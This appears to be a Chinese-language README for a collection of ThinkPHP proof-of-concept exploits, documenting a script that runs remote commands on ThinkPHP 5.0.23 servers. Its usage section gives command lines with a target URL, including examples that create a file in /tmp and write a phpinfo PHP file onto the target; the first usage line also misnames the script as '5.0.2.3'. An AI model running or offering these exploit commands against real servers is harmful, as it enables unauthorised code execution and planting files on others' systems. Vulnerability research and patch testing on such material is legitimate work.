# thinkphp-poc php thinkphp-poc集合
## thinkphp-5.0.23-rce.py thinkphp-5.0.23版本的 poc利用
### 使用说明
```
python thinkphp-5.0.2.3-rce.py -u [目标URL] -c [远程执行的命令]
// 使用示例
python thinkphp-5.0.23-rce.py -u http://10.0.0.135:8080/  -c "touch /tmp/bbb"
python thinkphp-5.0.23-rce.py -u http://10.0.0.135:8080/  -c "echo '<?php phpinfo(); ?>' > info.php"
```
